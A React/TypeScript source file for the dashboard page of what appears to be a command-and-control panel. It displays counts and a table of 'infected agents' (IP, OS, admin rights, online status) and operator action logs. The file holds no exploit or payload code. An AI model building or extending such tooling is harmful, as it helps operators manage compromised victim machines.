import { useEffect, useState } from "react";
import StatCard from "../../components/ui/StatsCard";
import InfectedAgentsTable from "./components/InfectedAgentsTable";
import SystemLogsCard from "./components/SystemLogsCard";
import { clientService } from "@/services/clientService";
import { logService } from "@/services/logService";
import { toTimestamp } from "@/lib/format";

export default function Dashboard() {
  const [stats, setStats] = useState([
    { title: "Total Agents", value: 0, accent: "default" as const },
    { title: "Online Agents", value: 0, accent: "info" as const },
    { title: "Admin Agents", value: 0, accent: "warn" as const },
    { title: "OS Types", value: 0, accent: "default" as const },
  ]);

  const [rows, setRows] = useState<any[]>([]);
  const [logs, setLogs] = useState<string[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  const fetchDashboardData = async () => {
    try {
      const [displayData, logsData] = await Promise.all([
        clientService.getClientsDisplay(),
        logService.getLogs(),
      ]);

      setStats([
        { title: "Total Agents", value: displayData.total_clients || 0, accent: "default" as const },
        {
          title: "Online Agents",
          value: displayData.online_clients_count || 0,
          accent: "info" as const,
        },
        {
          title: "Admin Agents",
          value: displayData.admin_clients_count || 0,
          accent: "warn" as const,
        },
        { title: "OS Types", value: displayData.os_types_count || 0, accent: "default" as const },
      ]);

      const mappedRows = (displayData.clients || []).map((client) => {
        const lastSeen = toTimestamp(client.last_seen);
        const now = Date.now();
        const isOnline = lastSeen > 0 && now - lastSeen < 60000;

        return {
          id: client.id,
          AgentID: client.id,
          IP: client.ip,
          OS: `${client.os} ${client.arch}`,
          osName: client.os,
          isAdmin: client.is_admin,
          lastSeen: client.last_seen,
          Status: isOnline ? "Online" : "Offline",
        };
      });
      setRows(mappedRows);

      const formattedLogs = (logsData || []).slice(0, 10).map((log: any) => {
        const date = new Date(toTimestamp(log.created_at));
        const hours = String(date.getHours()).padStart(2, "0");
        const minutes = String(date.getMinutes()).padStart(2, "0");
        const seconds = String(date.getSeconds()).padStart(2, "0");
        const timestamp = `${hours}:${minutes}:${seconds}`;

        const actor = log.username ? `Operator(${log.username})` : "System";
        const target = log.client_id
          ? ` [Agent: ${log.client_id.slice(0, 8)}...]`
          : "";
        return `[${timestamp}] ${actor}${target} - ${log.event_type}: ${log.details}`;
      });
      setLogs(formattedLogs);
      setError(null);
    } catch (err: any) {
      console.error("Error fetching dashboard data:", err);
      setError(err.message || "Failed to establish telemetry connection.");
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    fetchDashboardData();
    const interval = setInterval(fetchDashboardData, 10000);
    return () => clearInterval(interval);
  }, []);

  if (isLoading && stats[0].value === 0) {
    return (
      <div className="min-h-[calc(100vh-100px)] flex flex-col justify-center items-center font-mono text-green">
        <style>{`
          @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(300%); }
          }
        `}</style>
        <div className="relative flex flex-col items-center p-6 border border-green/30 bg-green/5 rounded-lg max-w-md w-full shadow-[0_0_20px_rgba(0,255,65,0.1)]">
          <div className="absolute top-0 left-0 border-t-2 border-l-2 border-green w-4 h-4 -mt-[1px] -ml-[1px]" />
          <div className="absolute top-0 right-0 border-t-2 border-r-2 border-green w-4 h-4 -mt-[1px] -mr-[1px]" />
          <div className="absolute bottom-0 left-0 border-b-2 border-l-2 border-green w-4 h-4 -mb-[1px] -ml-[1px]" />
          <div className="absolute bottom-0 right-0 border-b-2 border-r-2 border-green w-4 h-4 -mb-[1px] -mr-[1px]" />

          <div className="text-xl font-bold tracking-widest animate-pulse mb-3">
            SECURE_DCC_LINK_ACTIVE
          </div>
          <div className="w-full bg-[#111] h-1.5 rounded overflow-hidden relative border border-green/20">
            <div
              className="bg-green h-full absolute left-0 top-0 w-1/3 shadow-[0_0_10px_#00FF41]"
              style={{ animation: "shimmer 1.5s infinite linear" }}
            />
          </div>
          <div className="text-xs text-green/60 mt-3 font-mono">
            ESTABLISHING TELEMETRY CONNECTION...
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex flex-col px-4 sm:px-6 lg:px-10 py-5 sm:py-7 lg:py-9">
      <div className="w-full border-b border-green">
        <h1 className="text-xl sm:text-2xl font-semibold text-green pb-3 sm:pb-4 flex items-center">
          Dashboard
          <span className="inline-block w-2 h-2 rounded-full bg-green ml-2 animate-pulse" />
        </h1>
      </div>

      {error && (
        <div className="mt-4 p-3 border border-red-500/50 bg-red-950/20 text-red-400 font-mono text-xs rounded relative">
          <div className="absolute top-0 left-0 border-t-2 border-l-2 border-red-500 w-3 h-3 -mt-[1px] -ml-[1px]" />
          <div className="absolute top-0 right-0 border-t-2 border-r-2 border-red-500 w-3 h-3 -mt-[1px] -mr-[1px]" />
          [WARNING] SYSTEM ERROR: {error}
        </div>
      )}

      <div className="mt-5 grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-4 gap-3">
        {stats.map((item) => (
          <StatCard
            key={item.title}
            title={item.title}
            value={item.value}
            accent={item.accent}
          />
        ))}
      </div>
      <div className="mt-4 grid grid-cols-1 lg:grid-cols-3 gap-4">
        <InfectedAgentsTable rows={rows} />
        <SystemLogsCard logs={logs} />
      </div>
    </div>
  );
}
